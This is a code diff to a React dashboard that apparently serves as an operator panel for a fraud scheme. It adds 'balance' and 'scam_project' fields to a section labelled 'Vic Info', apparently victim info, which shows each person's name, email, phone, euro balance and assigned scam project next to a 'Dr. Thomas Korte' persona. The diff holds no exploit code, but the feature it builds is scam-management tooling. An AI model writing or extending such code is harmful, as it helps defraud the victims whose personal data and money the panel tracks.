@@ -83,6 +83,8 @@ export default function Dashboard() {
   const [profileName, setProfileName] = useState<string>("");
   const [profileEmail, setProfileEmail] = useState<string>("");
   const [profilePhone, setProfilePhone] = useState<string>("");
+  const [profileBalance, setProfileBalance] = useState<number | null>(null);
+  const [profileScamProject, setProfileScamProject] = useState<string>("");
   const [selectedId, setSelectedId] = useState<string | null>(null);
   const [copiedField, setCopiedField] = useState<string | null>(null);
   const [smsMessages, setSmsMessages] = useState<SMSMessage[]>([]);
@@ -102,7 +104,7 @@ export default function Dashboard() {
   const loadProfile = async () => {
     const { data } = await supabase
       .from("profiles")
-      .select("first_name, last_name, email, phone")
+      .select("first_name, last_name, email, phone, balance, scam_project")
       .eq("id", user!.id)
       .maybeSingle();
     if (data) {
@@ -110,6 +112,8 @@ export default function Dashboard() {
       setProfileName(name);
       setProfileEmail(data.email ?? "");
       setProfilePhone((data as any).phone ?? "");
+      setProfileBalance(data.balance ?? null);
+      setProfileScamProject(data.scam_project ?? "");
     }
   };
 
@@ -329,7 +333,7 @@ export default function Dashboard() {
         <img
           src={thomasKorteAsset.url}
           alt="Dr. Thomas Korte"
-          className="w-12 h-12 rounded-full object-cover border border-border shrink-0"
+          className="w-12 h-12 rounded-full object-cover object-[center_30%] border border-border shrink-0"
         />
         <div className="min-w-0">
           <p className="text-sm font-semibold text-foreground truncate">Dr. Thomas Korte</p>
@@ -351,7 +355,7 @@ export default function Dashboard() {
       <div className="flex-1 min-h-0" />
 
       {/* Vic Info */}
-      {(profileName || profileEmail || profilePhone) && (
+      {(profileName || profileEmail || profilePhone || profileBalance !== null || profileScamProject) && (
         <div className="rounded-lg bg-secondary/60 px-3 py-3 space-y-0.5">
           {profileName && (
             <p className="text-sm font-semibold text-foreground truncate">{profileName}</p>
@@ -361,6 +365,19 @@ export default function Dashboard() {
           )}
           {profilePhone && (
             <p className="text-xs text-muted-foreground truncate">{profilePhone}</p>
+          )}
+          {profileBalance !== null && (
+            <p className="text-xs text-foreground truncate">
+              Guthaben: {" "}
+              <span className="font-medium">
+                {new Intl.NumberFormat("de-DE", { style: "currency", currency: "EUR" }).format(profileBalance)}
+              </span>
+            </p>
+          )}
+          {profileScamProject && (
+            <p className="text-xs text-muted-foreground truncate">
+              Projekt: <span className="text-foreground">{profileScamProject}</span>
+            </p>
           )}
         </div>
       )}
